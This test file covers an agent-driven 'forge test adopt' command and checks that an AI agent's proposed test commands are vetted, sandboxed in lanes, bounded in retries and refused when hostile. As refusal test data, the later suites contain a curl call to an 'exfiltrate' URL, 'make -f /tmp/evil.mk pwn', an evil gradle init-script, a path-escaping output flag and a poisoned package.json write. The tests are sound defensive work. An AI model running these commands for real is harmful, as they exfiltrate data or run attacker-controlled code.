/**
 * `runAdoptTestsAgent` — `forge test adopt --agent` (`13` F-TEST-11, `specs/22` M17 P7). Against a
 * real, scripted `FakePlatformAdapter` session per round (the `(specs/22 M17 P7)` test-naming marker
 * this file carries throughout), a real local `node --test` subprocess run (no translator needed:
 * `format: 'tap'` is a built-in `TEST_REPORT_FORMATS` entry), and a real injected-failure probe —
 * never a hand-built `TranslatorProofResult` asserted against in isolation. Real-agent behaviour
 * (a live model session) is proven in P21, not mocked here (`process/plans/PLAN-M17.md` P7's own
 * "Tests first" bullet).
 *
 * **Real lanes, every round (critic round 3).** `projectWithTestArchitect`'s own `createTestProject`
 * already initialises a real git repo on `main` with real commits — `runAdoptTestsAgent`'s own real
 * `createLaneWorktree` call needs exactly that (`ctx.integrationBase` resolves to it), so every test
 * below exercises a REAL `git worktree add`/`remove` pair per round, not a stubbed one. One disclosed
 * test-design limitation, same spirit as this suite's own existing "real-agent behaviour is P21's
 * job" disclaimer above: `FakePlatformAdapter`'s own `execAttempts` are checked only against the
 * grant (`isExecAllowed`), never against `ctx.cwd` the way its `writeFiles` already are (`resolveIns
 * ideCwd`) — so a live, in-turn Bash EXEC call's own confinement to the lane is established here only
 * through the write channel (a `writeFiles` entry with no relation to the translator/claim, proven
 * absent from the real project afterward), never through a scripted exec attempt. The REAL property
 * (that a real `PlatformAdapter`'s own live exec, not only its writes, is confined to `SessionRequest
 * .cwd`) is a requirement the adapter-kit conformance suite itself enforces (C2/C4) on every real
 * adapter, independent of this file.
 */
import { mkdir, mkdtemp, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import path from 'node:path';

import type { PlatformAdapter, SessionRequest } from '@forge/adapter-kit/types';
import {
  checkTestAdoptionApproved,
  readStagedProposal,
} from '../../../../src/commands/loop/test/adopt.ts';
import { FakePlatformAdapter } from '@forge/testkit';
import { readTextFile } from '@forge/core/fs';
import { afterEach, describe, expect, it } from 'vitest';

import {
  runAdoptTestsAgent,
  type AdoptTestsAgentDeps,
} from '../../../../src/commands/loop/test/adopt-agent.ts';
import {
  AGENTS_ROOT,
  CHECKS_ROOT,
  cleanupAll,
  createTestProject,
  writeFixtureAgent,
} from '../helpers.ts';

afterEach(cleanupAll);

const KB_ROOT = 'docs/forge/kb';

type Project = Awaited<ReturnType<typeof createTestProject>>;

/** A fixed, injected clock (`QUALITY-BAR.md` R10) -- a monotonically distinct value per call, so a
 * round's own `runId` (derived from it) never collides with another round's. */
function fixedClock(): { now: () => string } {
  let tick = 0;
  return { now: () => `2026-01-0${String((tick += 1))}T00:00:00.000Z` };
}

async function tempDir(): Promise<string> {
  const dir = await mkdtemp(path.join(tmpdir(), 'forge-adopt-agent-'));
  return dir;
}

function makeCreateTempPath(dir: string): () => string {
  let counter = 0;
  return () => path.join(dir, `tmp-output-${String((counter += 1))}.raw`);
}

async function projectWithTestArchitect(): Promise<Project> {
  const project = await createTestProject();
  await writeFixtureAgent(project.dir, 'test-architect', 'Test Architect', {
    write: true,
    exec: ['ls*'],
  });
  // `createTestProject`'s own shared fixture materialises `.forge/briefs/fixture.md` for the OTHER
  // commands' tests, never this piece's own real, shipped `briefs/adopt-tests.md` -- written here
  // instead of broadening that shared helper for one new caller.
  await mkdir(path.join(project.dir, '.forge', 'briefs'), { recursive: true });
  await writeFile(
    path.join(project.dir, '.forge', 'briefs', 'adopt-tests.md'),
    'Fixture adopt-tests brief: investigate, propose, prove.\n',
  );
  return project;
}

function deps(project: Project, adapter: PlatformAdapter): AdoptTestsAgentDeps {
  return {
    paths: project.paths,
    projectRoot: project.dir,
    config: project.config,
    adapter,
    checksRoot: CHECKS_ROOT,
    agentsRoot: AGENTS_ROOT,
    kbRoot: KB_ROOT,
  };
}

/** A real, deliberately-failing `node:test` test, the identical idiom `proof.test.ts`'s own
 * `REAL_PROBE` already uses for a genuine `node --test` TAP run. */
function probeContent(testName: string): string {
  return `
const test = require('node:test');
const assert = require('node:assert');
test(${JSON.stringify(testName)}, () => { assert.strictEqual(1, 2); });
`;
}

// `'node --test'` literally -- not `process.execPath`: a real agent's own proposal names the plain
// program, and `vetProposedTestCommand`'s own real vet (specs/22 M17 P7) refuses an absolute
// interpreter path, which matches no `ADOPT_TESTS_EXEC_PATTERNS` entry (`node --test*` is anchored to
// the literal word `node`). `node` resolves on `PATH` in this test environment the identical way the
// test runner's own `node scripts/run-tests.mjs` invocation already did.
const NODE_TEST_COMMAND = {
  run: 'node --test',
  output: { source: 'stdout' as const },
  format: 'tap' as const,
};

describe('runAdoptTestsAgent -- a passing proof on the first round (specs/22 M17 P7)', () => {
  it('stages a real record with source "agent" and a real, recorded proof', async () => {
    const dir = await tempDir();
    const project = await projectWithTestArchitect();
    const adapter = new FakePlatformAdapter();
    adapter.script(() => true, {
      text: ['investigated package.json; no test script found; node --test discovers *.test.js'],
      structured: {
        command: NODE_TEST_COMMAND,
        probe: {
          path: 'probe.test.js',
          content: probeContent('PROBE deliberately fails'),
          expectedName: 'PROBE deliberately fails',
        },
        runnerVersion: process.version,
        reason: 'package.json has no test script; node --test discovers *.test.js directly.',
      },
    });

    const result = await runAdoptTestsAgent(deps(project, adapter), {
      layer: 'unit',
      clock: fixedClock(),
      createTempPath: makeCreateTempPath(dir),
    });

    expect(result.outcome).toBe('staged');
    if (result.outcome !== 'staged') throw new Error('unreachable');
    expect(result.rounds).toBe(1);
    expect(result.record.source).toBe('agent');
    expect(result.record.proof?.ok).toBe(true);

    // The REAL file on disk, read back through the real P6 reader -- never only the in-memory result.
    const onDisk = await readStagedProposal(project.paths, 'unit');
    expect(onDisk).toEqual({ outcome: 'found', record: result.record });

    await rm(dir, { recursive: true, force: true });
  });

  it('reaches the G-TestAdopt deterministic check -- checkTestAdoptionApproved reports unapproved=0 off the real staged record (specs/22 M17 P7: "a translator that passes the proof reaches the gate")', async () => {
    const dir = await tempDir();
    const project = await projectWithTestArchitect();
    const adapter = new FakePlatformAdapter();
    adapter.script(() => true, {
      text: ['investigated package.json; proposing node --test'],
      structured: {
        command: NODE_TEST_COMMAND,
        probe: {
          path: 'probe.test.js',
          content: probeContent('PROBE deliberately fails'),
          expectedName: 'PROBE deliberately fails',
        },
        runnerVersion: process.version,
        reason: 'package.json has no test script; node --test discovers *.test.js directly.',
      },
    });

    const result = await runAdoptTestsAgent(deps(project, adapter), {
      layer: 'unit',
      clock: fixedClock(),
      createTempPath: makeCreateTempPath(dir),
    });
    expect(result.outcome).toBe('staged');

    // The real gate's own check, in-process (`bin.ts`'s `--check-proof` runs this exact function) --
    // never a hand-built evidence object asserted against in isolation.
    const check = await checkTestAdoptionApproved(project.paths, 'unit');
    expect(check).toMatchObject({ v: 1, layer: 'unit', unapproved: 0 });

    await rm(dir, { recursive: true, force: true });
  });
});

describe('runAdoptTestsAgent -- a failing proof loops back with the named check, until it passes (specs/22 M17 P7)', () => {
  it("round 1 names check 3 (the probe) wrong; round 2 fixes it and stages, with the feedback in round 2's own prompt", async () => {
    const dir = await tempDir();
    const project = await projectWithTestArchitect();
    const adapter = new FakePlatformAdapter();
    const requests: SessionRequest[] = [];
    adapter.script(
      (request) => {
        requests.push(request);
        return request.stepId.includes(':round-1');
      },
      {
        text: ['round 1: proposing a probe'],
        structured: {
          command: NODE_TEST_COMMAND,
          // Content names the test "PROBE deliberately fails", but this round's own `expectedName`
          // claims a DIFFERENT name -- check 3 fails to find it.
          probe: {
            path: 'probe.test.js',
            content: probeContent('PROBE deliberately fails'),
            expectedName: 'the wrong name',
          },
          runnerVersion: process.version,
          reason: 'round 1 guess',
        },
      },
    );
    adapter.script((request) => request.stepId.includes(':round-2'), {
      text: ['round 2: the real name, after reading the proof failure'],
      structured: {
        command: NODE_TEST_COMMAND,
        probe: {
          path: 'probe.test.js',
          content: probeContent('PROBE deliberately fails'),
          expectedName: 'PROBE deliberately fails',
        },
        runnerVersion: process.version,
        reason: 'round 2: fixed the probe name after the recorded check-3 failure',
      },
    });

    const result = await runAdoptTestsAgent(deps(project, adapter), {
      layer: 'unit',
      clock: fixedClock(),
      createTempPath: makeCreateTempPath(dir),
    });

    expect(result.outcome).toBe('staged');
    if (result.outcome !== 'staged') throw new Error('unreachable');
    expect(result.rounds).toBe(2);

    // Round 2's own real, assembled system prompt (the "Step brief" block `node.brief`'s fixed
    // kickoff line points at) carries round 1's own real failing-check feedback -- not reconstructed
    // independently, the actual text the session was sent.
    expect(requests).toHaveLength(2);
    const round2System = requests[1]?.systemPrompt.text ?? '';
    expect(round2System).toContain('round 2');
    expect(round2System).toContain('check 3');
    expect(round2System).toContain('the wrong name');

    await rm(dir, { recursive: true, force: true });
  });
});

describe('runAdoptTestsAgent -- stops after the bound and discloses the last failure (specs/22 M17 P7)', () => {
  it('exhausts 3 rounds (default), never a 4th, and names the real failing check', async () => {
    const dir = await tempDir();
    const project = await projectWithTestArchitect();
    const adapter = new FakePlatformAdapter();
    let calls = 0;
    adapter.script(
      () => {
        calls += 1;
        return true;
      },
      {
        text: ['always the wrong probe name'],
        structured: {
          command: NODE_TEST_COMMAND,
          probe: {
            path: 'probe.test.js',
            content: probeContent('PROBE deliberately fails'),
            expectedName: 'never matches',
          },
          runnerVersion: process.version,
          reason: 'always wrong, on purpose',
        },
      },
    );

    const result = await runAdoptTestsAgent(deps(project, adapter), {
      layer: 'unit',
      clock: fixedClock(),
      createTempPath: makeCreateTempPath(dir),
    });

    expect(result.outcome).toBe('exhausted');
    if (result.outcome !== 'exhausted') throw new Error('unreachable');
    expect(result.cause).toBe('proof-failed');
    if (result.cause !== 'proof-failed') throw new Error('unreachable');
    expect(result.rounds).toBe(3);
    expect(result.failedCheck).toBe(3);
    expect(result.reason).toContain('never matches');
    expect(calls).toBe(3); // never a 4th session

    // Nothing is staged for a fully-exhausted round -- `adopt.ts`'s own "nothing reaches
    // .forge/config.yaml without approval" extends here: nothing reaches even the STAGED record.
    const onDisk = await readStagedProposal(project.paths, 'unit');
    expect(onDisk.outcome).toBe('missing');

    await rm(dir, { recursive: true, force: true });
  });
});

describe('runAdoptTestsAgent -- no test setup at all: a proposal and an ADR, never a dependency change (specs/22 M17 P7)', () => {
  it("stages a record with no proof and writes a real ADR carrying the agent's own summary", async () => {
    const dir = await tempDir();
    const project = await projectWithTestArchitect();
    const adapter = new FakePlatformAdapter();
    adapter.script(() => true, {
      text: ['no test setup found at all; proposing vitest'],
      structured: {
        noTestsFound: true,
        command: {
          run: 'npx vitest run --reporter=json',
          output: { source: 'stdout' },
          format: 'vitest-json',
        },
        adrSummary: '## Context\n\nNo test runner is configured.\n\n## Decision\n\nAdopt vitest.\n',
        reason: 'no package.json test script, no CI test step, no test files found anywhere.',
      },
    });

    const result = await runAdoptTestsAgent(deps(project, adapter), {
      layer: 'unit',
      clock: fixedClock(),
      createTempPath: makeCreateTempPath(dir),
    });

    expect(result.outcome).toBe('no-test-setup');
    if (result.outcome !== 'no-test-setup') throw new Error('unreachable');
    expect(result.record.source).toBe('agent');
    expect(result.record.proof).toBeUndefined();

    const adrText = await readTextFile(project.paths.resolveWithin(result.adrPath));
    expect(adrText).toContain('Adopt vitest');

    // Never a silently added dependency: no package.json was written or touched by this run.
    const { pathExists } = await import('@forge/core/fs');
    expect(await pathExists(project.paths.resolveWithin('package.json'))).toBe(false);

    await rm(dir, { recursive: true, force: true });
  });
});

describe('runAdoptTestsAgent -- a stray write during investigation never reaches the real project (specs/22 M17 P7) (critic round 3)', () => {
  it('a session that writes a file with no relation to the translator or the HandoffRecord succeeds (no refusal), and the real project never sees that file at all', async () => {
    const dir = await tempDir();
    const project = await projectWithTestArchitect();
    const adapter = new FakePlatformAdapter();
    adapter.script(() => true, {
      text: ['writing a stray investigation note, and a translator'],
      writeFiles: [
        { relativePath: 'notes.txt', content: 'should never land in the real project\n' },
        {
          relativePath: '.forge/test-translators/unit.js',
          content:
            "process.stdout.write(JSON.stringify({forgeTestReport:1,tests:[{name:'PROBE deliberately fails',status:'fail'}]}));\n",
        },
      ],
      structured: {
        command: {
          run: 'node --test',
          output: { source: 'stdout' },
          format: 'forge-json',
          translate: 'node .forge/test-translators/unit.js',
        },
        probe: {
          path: 'probe.test.js',
          content: probeContent('PROBE deliberately fails'),
          expectedName: 'PROBE deliberately fails',
        },
        translatorPath: '.forge/test-translators/unit.js',
        runnerVersion: process.version,
        reason: 'a stray note alongside the real translator',
      },
    });

    const result = await runAdoptTestsAgent(deps(project, adapter), {
      layer: 'unit',
      clock: fixedClock(),
      createTempPath: makeCreateTempPath(dir),
    });
    expect(result.outcome).toBe('staged');

    // The translator landed for real (the one thing this invocation copies out)...
    const { pathExists } = await import('@forge/core/fs');
    expect(await pathExists(project.paths.resolveWithin('.forge/test-translators/unit.js'))).toBe(
      true,
    );
    // ...but the stray note the SAME session wrote, with no relation to that one copy-out, is nowhere
    // in the real project: it only ever existed in a lane this function has already discarded. There
    // is no write-claim refusal to prove this via any more (this file's own production code doc
    // comment, "History") -- this is the real, observable replacement for it.
    expect(await pathExists(project.paths.resolveWithin('notes.txt'))).toBe(false);

    await rm(dir, { recursive: true, force: true });
  });
});

describe('runAdoptTestsAgent -- a structured response that is not a usable proposal is retried with feedback, not an immediate failure (specs/22 M17 P7) (M17 P21 live-run fix)', () => {
  it('round 1 reports no "command" at all; round 2 gets the real parse-failure feedback and succeeds with a valid proposal', async () => {
    const dir = await tempDir();
    const project = await projectWithTestArchitect();
    const adapter = new FakePlatformAdapter();
    const requests: SessionRequest[] = [];
    adapter.script(
      (request) => {
        requests.push(request);
        return request.stepId.includes(':round-1');
      },
      {
        text: ['a reply with no real structured proposal'],
        structured: { reason: 'I looked, but did not report a real command' },
      },
    );
    adapter.script((request) => request.stepId.includes(':round-2'), {
      text: ['round 2: a real proposal, after reading the parse failure'],
      structured: {
        command: NODE_TEST_COMMAND,
        probe: {
          path: 'probe.test.js',
          content: probeContent('PROBE deliberately fails'),
          expectedName: 'PROBE deliberately fails',
        },
        runnerVersion: process.version,
        reason: 'round 2: a real command, after round 1 never parsed at all',
      },
    });

    const result = await runAdoptTestsAgent(deps(project, adapter), {
      layer: 'unit',
      clock: fixedClock(),
      createTempPath: makeCreateTempPath(dir),
    });

    // This is the exact live defect (M17 P21): round 1's own RUN-160 used to end the WHOLE command
    // outright, with zero chance for round 2 to ever run. It now stages for real, same as a round
    // that fixed a failing proof instead.
    expect(result.outcome).toBe('staged');
    if (result.outcome !== 'staged') throw new Error('unreachable');
    expect(result.rounds).toBe(2);

    // Round 2's own real, assembled prompt carries round 1's own real parse-failure feedback -- not
    // reconstructed independently, the actual text the session was sent.
    expect(requests).toHaveLength(2);
    const round2System = requests[1]?.systemPrompt.text ?? '';
    expect(round2System).toContain('round 2');
    expect(round2System).toContain('structured response was not usable');
    // The real validation detail `parseProposalResponse` raises for a root-level union mismatch --
    // the EXACT text the live M17 P21 defect's own observed `RUN-160` carried ("(root): Invalid
    // input."), not a hand-picked substring of the agent's own (unparsed, never read) free text.
    expect(round2System).toContain('(root): Invalid input');

    await rm(dir, { recursive: true, force: true });
  });

  it('round 1 reports the legacy bare-string "command" form; round 2 fixes it and succeeds, with the feedback in round 2\'s own prompt', async () => {
    const dir = await tempDir();
    const project = await projectWithTestArchitect();
    const adapter = new FakePlatformAdapter();
    const requests: SessionRequest[] = [];
    adapter.script(
      (request) => {
        requests.push(request);
        return request.stepId.includes(':round-1');
      },
      {
        text: ['a bare-string command'],
        structured: {
          command: 'pnpm test',
          probe: { path: 'probe.test.js', content: probeContent('x'), expectedName: 'x' },
          runnerVersion: '1.0.0',
          reason: 'a bare string, which an agent proposal may not use',
        },
      },
    );
    adapter.script((request) => request.stepId.includes(':round-2'), {
      text: ['round 2: the structured form, after reading the parse failure'],
      structured: {
        command: NODE_TEST_COMMAND,
        probe: {
          path: 'probe.test.js',
          content: probeContent('PROBE deliberately fails'),
          expectedName: 'PROBE deliberately fails',
        },
        runnerVersion: process.version,
        reason: 'round 2: the structured form this time',
      },
    });

    const result = await runAdoptTestsAgent(deps(project, adapter), {
      layer: 'unit',
      clock: fixedClock(),
      createTempPath: makeCreateTempPath(dir),
    });

    expect(result.outcome).toBe('staged');
    if (result.outcome !== 'staged') throw new Error('unreachable');
    expect(result.rounds).toBe(2);

    const round2System = requests[1]?.systemPrompt.text ?? '';
    expect(round2System).toContain('legacy bare-string form');

    await rm(dir, { recursive: true, force: true });
  });

  it('a "translatorPath" outside .forge/test-translators/ is retried too (never copies some other in-lane file over a real project path, critic round 3) -- round 2 fixes the path and succeeds', async () => {
    const dir = await tempDir();
    const project = await projectWithTestArchitect();
    const adapter = new FakePlatformAdapter();
    adapter.script((request) => request.stepId.includes(':round-1'), {
      text: ['naming an out-of-claim translatorPath'],
      writeFiles: [{ relativePath: 'package.json', content: '{"poisoned": true}\n' }],
      structured: {
        command: {
          run: 'node --test',
          output: { source: 'stdout' },
          format: 'forge-json',
          translate: 'node package.json',
        },
        probe: { path: 'probe.test.js', content: probeContent('x'), expectedName: 'x' },
        // Not under TRANSLATOR_CLAIM_PREFIX -- a real in-lane file, just not the right one.
        translatorPath: 'package.json',
        runnerVersion: process.version,
        reason: 'wrong path, on purpose',
      },
    });
    adapter.script((request) => request.stepId.includes(':round-2'), {
      text: ['round 2: the real translator, at the real claim path'],
      writeFiles: [
        {
          relativePath: '.forge/test-translators/unit.js',
          content:
            "process.stdout.write(JSON.stringify({forgeTestReport:1,tests:[{name:'PROBE deliberately fails',status:'fail'}]}));\n",
        },
      ],
      structured: {
        command: {
          run: 'node --test',
          output: { source: 'stdout' },
          format: 'forge-json',
          translate: 'node .forge/test-translators/unit.js',
        },
        probe: {
          path: 'probe.test.js',
          content: probeContent('PROBE deliberately fails'),
          expectedName: 'PROBE deliberately fails',
        },
        translatorPath: '.forge/test-translators/unit.js',
        runnerVersion: process.version,
        reason: 'round 2: the real claim-prefixed path',
      },
    });

    const result = await runAdoptTestsAgent(deps(project, adapter), {
      layer: 'unit',
      clock: fixedClock(),
      createTempPath: makeCreateTempPath(dir),
    });
    expect(result.outcome).toBe('staged');
    if (result.outcome !== 'staged') throw new Error('unreachable');
    expect(result.rounds).toBe(2);

    // Round 1's own out-of-claim proposal was never copied, even though round 2 later succeeded.
    const { pathExists } = await import('@forge/core/fs');
    expect(await pathExists(project.paths.resolveWithin('package.json'))).toBe(false);
    expect(await pathExists(project.paths.resolveWithin('.forge/test-translators/unit.js'))).toBe(
      true,
    );

    await rm(dir, { recursive: true, force: true });
  });
});

describe('runAdoptTestsAgent -- a structured response that is NEVER usable, round after round, exhausts the same bound a failing proof already has (specs/22 M17 P7) (M17 P21 live-run fix)', () => {
  it('exhausts 3 rounds (default), never a 4th, when "command" is missing every round -- a typed result, never an uncaught RUN-160', async () => {
    const dir = await tempDir();
    const project = await projectWithTestArchitect();
    const adapter = new FakePlatformAdapter();
    let calls = 0;
    adapter.script(
      () => {
        calls += 1;
        return true;
      },
      {
        text: ['a reply with no real structured proposal'],
        structured: { reason: 'I looked, but did not report a real command' },
      },
    );

    const result = await runAdoptTestsAgent(deps(project, adapter), {
      layer: 'unit',
      clock: fixedClock(),
      createTempPath: makeCreateTempPath(dir),
    });

    expect(result.outcome).toBe('exhausted');
    if (result.outcome !== 'exhausted') throw new Error('unreachable');
    expect(result.cause).toBe('invalid-response');
    if (result.cause !== 'invalid-response') throw new Error('unreachable');
    expect(result.rounds).toBe(3);
    // The real validation detail, the identical text the live M17 P21 defect's own observed
    // `RUN-160` carried verbatim ("(root): Invalid input.") -- proving this exhaustion is driven by
    // the SAME real zod failure the live run hit, not a different, friendlier stand-in.
    expect(result.reason).toContain('(root): Invalid input');
    expect(calls).toBe(3); // bounded -- never a 4th session, the identical bound a failing proof has

    // Nothing is staged for a fully-exhausted round, the identical guarantee a failing-proof
    // exhaustion already has.
    const onDisk = await readStagedProposal(project.paths, 'unit');
    expect(onDisk.outcome).toBe('missing');

    await rm(dir, { recursive: true, force: true });
  });
});

describe('runAdoptTestsAgent -- a malicious proposed command never reaches a real shell unsandboxed (specs/22 M17 P7) (critic round 2)', () => {
  it('throws RUN-161 and never writes the marker file -- live repro of the finding: a session reporting command.run via structured JSON alone, no tool-use write at all, previously reached a real shell with no relation to the exec grant', async () => {
    const dir = await tempDir();
    const project = await projectWithTestArchitect();
    const marker = path.join(tmpdir(), `forge-p7-exploit-marker-${String(Date.now())}.txt`);
    await rm(marker, { force: true });
    const adapter = new FakePlatformAdapter();
    adapter.script(() => true, {
      // No `writeFiles` at all: the session's only "write" is this structured JSON report.
      text: ['proposing a command'],
      structured: {
        command: {
          run: `npx vitest run --outputFile=${marker}`,
          output: { source: 'stdout' },
          format: 'vitest-json',
        },
        probe: { path: 'probe.test.js', content: probeContent('x'), expectedName: 'x' },
        runnerVersion: '1.0.0',
        reason: 'a path-escaping command, reported only in the structured response',
      },
    });

    await expect(
      runAdoptTestsAgent(deps(project, adapter), {
        layer: 'unit',
        clock: fixedClock(),
        createTempPath: makeCreateTempPath(dir),
      }),
    ).rejects.toMatchObject({ code: 'RUN-161' });

    const { existsSync } = await import('node:fs');
    expect(existsSync(marker)).toBe(false);

    await rm(marker, { force: true });
    await rm(dir, { recursive: true, force: true });
  });

  it('throws RUN-161 for a command.translate the live session grant never saw, not only command.run', async () => {
    const dir = await tempDir();
    const project = await projectWithTestArchitect();
    const adapter = new FakePlatformAdapter();
    adapter.script(() => true, {
      text: ['proposing a translator'],
      structured: {
        command: {
          run: 'node --test',
          output: { source: 'stdout' },
          format: 'forge-json',
          translate: 'curl http://example.com/exfiltrate',
        },
        probe: { path: 'probe.test.js', content: probeContent('x'), expectedName: 'x' },
        runnerVersion: '1.0.0',
        reason: 'a network-reaching translate field',
      },
    });

    await expect(
      runAdoptTestsAgent(deps(project, adapter), {
        layer: 'unit',
        clock: fixedClock(),
        createTempPath: makeCreateTempPath(dir),
      }),
    ).rejects.toMatchObject({ code: 'RUN-161' });

    await rm(dir, { recursive: true, force: true });
  });

  it('a RUN-161 vet refusal is NEVER retried, unlike a RUN-160 parse/claim failure (M17 P21: the deliberate split) -- ends the whole command on round 1 of 3, no round 2 ever starts', async () => {
    const dir = await tempDir();
    const project = await projectWithTestArchitect();
    const adapter = new FakePlatformAdapter();
    let calls = 0;
    adapter.script(
      () => {
        calls += 1;
        // Always reports the SAME vet-refused command, every round it would otherwise be asked for --
        // if this were retried the way RUN-160 now is, 3 rounds would run before exhausting; it must
        // not even reach round 2.
        return true;
      },
      {
        text: ['always the same refused command'],
        structured: {
          command: {
            run: 'make -f /tmp/evil.mk pwn',
            output: { source: 'stdout' },
            format: 'tap',
          },
          probe: { path: 'probe.test.js', content: probeContent('x'), expectedName: 'x' },
          runnerVersion: '1.0.0',
          reason: 'always the same refused command, on purpose',
        },
      },
    );

    await expect(
      runAdoptTestsAgent(deps(project, adapter), {
        layer: 'unit',
        maxRounds: 3,
        clock: fixedClock(),
        createTempPath: makeCreateTempPath(dir),
      }),
    ).rejects.toMatchObject({ code: 'RUN-161' });

    // A hard stop on round 1, not a retry: exactly one session ever ran, even though 3 rounds were
    // available and the identical failure would have run all 3 had this been a RUN-160.
    expect(calls).toBe(1);

    await rm(dir, { recursive: true, force: true });
  });
});

describe('runAdoptTestsAgent -- a stale translator from an earlier, unrelated invocation is cleaned up before the winning one is copied in (specs/22 M17 P7) (critic round 3)', () => {
  it('a leftover .forge/test-translators/unit.py from a past invocation is removed once this invocation stages its own unit.js', async () => {
    const dir = await tempDir();
    const project = await projectWithTestArchitect();
    // A real, pre-existing leftover from some EARLIER, separate `runAdoptTestsAgent` call for this
    // same layer -- committed to nothing, just sitting in the real project's own working tree, the
    // only shape of staleness the new, per-invocation lane model still leaves possible (this file's
    // own production code doc comment, "History").
    await mkdir(path.join(project.dir, '.forge', 'test-translators'), { recursive: true });
    await writeFile(
      path.join(project.dir, '.forge', 'test-translators', 'unit.py'),
      '# a translator from a past, unrelated invocation\n',
    );

    const adapter = new FakePlatformAdapter();
    adapter.script(() => true, {
      text: ['proposing a fresh translator'],
      writeFiles: [
        {
          relativePath: '.forge/test-translators/unit.js',
          content:
            "process.stdout.write(JSON.stringify({forgeTestReport:1,tests:[{name:'PROBE deliberately fails',status:'fail'}]}));\n",
        },
      ],
      structured: {
        command: {
          run: 'node --test',
          output: { source: 'stdout' },
          format: 'forge-json',
          translate: 'node .forge/test-translators/unit.js',
        },
        probe: {
          path: 'probe.test.js',
          content: probeContent('PROBE deliberately fails'),
          expectedName: 'PROBE deliberately fails',
        },
        translatorPath: '.forge/test-translators/unit.js',
        runnerVersion: process.version,
        reason: 'a fresh, real translator for this invocation',
      },
    });

    const result = await runAdoptTestsAgent(deps(project, adapter), {
      layer: 'unit',
      clock: fixedClock(),
      createTempPath: makeCreateTempPath(dir),
    });
    expect(result.outcome).toBe('staged');

    const { pathExists } = await import('@forge/core/fs');
    // The stale leftover is gone...
    expect(await pathExists(project.paths.resolveWithin('.forge/test-translators/unit.py'))).toBe(
      false,
    );
    // ...and the real, winning translator is there instead -- not merely "staged" in memory.
    expect(await pathExists(project.paths.resolveWithin('.forge/test-translators/unit.js'))).toBe(
      true,
    );

    const check = await checkTestAdoptionApproved(project.paths, 'unit');
    expect(check).toMatchObject({ unapproved: 0 });

    await rm(dir, { recursive: true, force: true });
  });
});

describe("runAdoptTestsAgent -- a real per-call gate on the session's own LIVE exec (specs/22 M17 P7) (critic round 4)", () => {
  it('sets SessionRequest.vetExecCommand for real, and that real callback refuses the exact exploit lane isolation never actually contained, while allowing a real, conventional command', async () => {
    const dir = await tempDir();
    const project = await projectWithTestArchitect();
    const adapter = new FakePlatformAdapter();
    adapter.script(() => true, {
      text: ['investigated package.json; no test script found; node --test discovers *.test.js'],
      structured: {
        command: NODE_TEST_COMMAND,
        probe: {
          path: 'probe.test.js',
          content: probeContent('PROBE deliberately fails'),
          expectedName: 'PROBE deliberately fails',
        },
        runnerVersion: process.version,
        reason: 'package.json has no test script; node --test discovers *.test.js directly.',
      },
    });

    let captured: SessionRequest | undefined;
    const capturing: PlatformAdapter = {
      id: adapter.id,
      displayName: adapter.displayName,
      capabilities: () => adapter.capabilities(),
      preflight: () => adapter.preflight(),
      listModels: () => adapter.listModels(),
      startSession: (req: SessionRequest) => {
        captured = req;
        return adapter.startSession(req);
      },
      resumeSession: (sessionId, req) => adapter.resumeSession(sessionId, req),
    };

    const result = await runAdoptTestsAgent(deps(project, capturing), {
      layer: 'unit',
      clock: fixedClock(),
      createTempPath: makeCreateTempPath(dir),
    });
    expect(result.outcome).toBe('staged');

    // `runAdoptTestsAgent` really sets the field -- not merely declares it legal to set.
    expect(captured?.vetExecCommand).toBeDefined();
    const gate = captured?.vetExecCommand;
    if (gate === undefined) throw new Error('unreachable');

    // The exact live-exec exploit critic round 2/3 found and round 3's own lane isolation never
    // actually contained (the finding this whole gate exists to close): refused, for real, through
    // the real `vetProposedCommand` mechanism -- never a hand-asserted "would be refused."
    await expect(gate('make -f /tmp/evil.mk pwn')).resolves.toMatchObject({ allowed: false });
    await expect(gate('./gradlew --init-script=/tmp/evil.gradle tasks')).resolves.toMatchObject({
      allowed: false,
    });
    // A real, conventional command this piece's own allowlist already covers still passes -- the
    // gate narrows a live Bash decision, it does not blanket-deny every command.
    await expect(gate('node --test')).resolves.toMatchObject({ allowed: true });

    await rm(dir, { recursive: true, force: true });
  });
});

describe('runAdoptTestsAgent -- refuses upfront on a transport with no real per-call exec gate (specs/22 M17 P7) (critic round 5)', () => {
  it('throws RUN-162, naming the real adapter id, before any lane, session, or agent definition is ever touched', async () => {
    const dir = await tempDir();
    const project = await projectWithTestArchitect();
    // A real FakePlatformAdapter, deliberately configured to report the identical capability a real
    // Claude Code adapter pinned to (or fallen back onto) its CLI transport would honestly report --
    // never a hand-built stub asserting a refusal this function does not actually implement.
    const adapter = new FakePlatformAdapter({ execCommandGating: false });
    let sessionStarted = false;
    const spying: PlatformAdapter = {
      id: adapter.id,
      displayName: adapter.displayName,
      capabilities: () => adapter.capabilities(),
      preflight: () => adapter.preflight(),
      listModels: () => adapter.listModels(),
      startSession: (req: SessionRequest) => {
        sessionStarted = true;
        return adapter.startSession(req);
      },
      resumeSession: (sessionId, req) => adapter.resumeSession(sessionId, req),
    };

    await expect(
      runAdoptTestsAgent(deps(project, spying), {
        layer: 'unit',
        clock: fixedClock(),
        createTempPath: makeCreateTempPath(dir),
      }),
    ).rejects.toMatchObject({ code: 'RUN-162' });

    // Never even reached the point of starting a session -- a real refusal, not a mid-session abort.
    expect(sessionStarted).toBe(false);

    await rm(dir, { recursive: true, force: true });
  });
});

describe('runAdoptTestsAgent -- a genuine infrastructure failure still propagates immediately, never swallowed as "the agent had a bad day" (specs/22 M17 P7) (M17 P21 live-run fix)', () => {
  it('a real adapter failure in startSession (not a parsed-response problem at all) rejects with the SAME error, on round 1, with no retry', async () => {
    const dir = await tempDir();
    const project = await projectWithTestArchitect();
    const adapter = new FakePlatformAdapter();
    adapter.script(() => true, {
      text: ['this script is never reached'],
      structured: {
        command: NODE_TEST_COMMAND,
        probe: { path: 'probe.test.js', content: probeContent('x'), expectedName: 'x' },
        runnerVersion: process.version,
        reason: 'never reached',
      },
    });

    // A genuine infrastructure-shaped failure -- a real bug or outage in the adapter itself, nothing
    // to do with the quality of any agent's structured response -- modelled the same way this suite's
    // own pre-existing `capturing`/`spying` adapters already wrap a real `FakePlatformAdapter`. This
    // is NOT a `ForgeError` at all, let alone a `RUN-160`: the new round-loop `catch`
    // (`adopt-agent.ts`) must re-throw it unrecognised, not relabel it as a retry-worthy agent
    // response.
    let calls = 0;
    const brokenInfra = new Error(
      'ECONNRESET: a real adapter/transport failure, not an agent problem',
    );
    const faulty: PlatformAdapter = {
      id: adapter.id,
      displayName: adapter.displayName,
